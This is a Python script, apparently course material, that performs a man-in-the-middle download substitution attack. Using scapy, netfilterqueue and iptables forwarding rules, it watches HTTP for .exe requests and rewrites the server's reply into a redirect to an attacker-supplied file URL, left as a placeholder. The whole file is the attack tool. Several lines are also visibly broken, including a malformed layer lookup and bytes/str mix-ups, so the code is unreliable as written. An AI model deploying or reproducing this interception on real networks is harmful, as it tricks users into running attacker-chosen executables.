import scapy.all as scapy
from netfilterqueue import NetfilterQueue

# iptables --flush
# iptables -I FORWARD -j NFQUEUE --queue -num 0

ack_list = []


def set_load(packet, url_to_download):

    load = f'HTTP/1.1 301 Moved Permanently\nLocation: {url_to_download}\n\n'

    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('[+] .exe Requested')

                ack_list.append(scapy_packet[scapy_packet.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Repplacing File')

                modified_packet = set_load(scapy_packet, 'example download url for a file' )

                packet.set_payload(str(modified_packet))



queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()









